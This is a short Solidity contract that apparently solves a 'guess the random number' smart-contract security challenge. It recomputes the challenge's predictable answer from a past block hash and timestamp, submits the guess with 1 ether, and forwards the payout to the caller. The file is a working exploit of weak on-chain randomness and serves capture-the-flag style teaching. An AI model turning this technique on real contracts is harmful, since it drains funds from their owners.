pragma solidity ^0.4.24;

import "./challenge.sol";

contract GuessTheRandomNumberChallengeSolver {

    function solve(address contractToSolve, uint256 height, uint256 timestamp) public payable {
        GuessTheRandomNumberChallenge c = GuessTheRandomNumberChallenge(contractToSolve);
        uint8 answer = uint8(keccak256(block.blockhash(height - 1), timestamp));
        c.guess.value(1 ether)(answer);
        msg.sender.transfer(address(this).balance);
    }

     function() payable public {
    }
}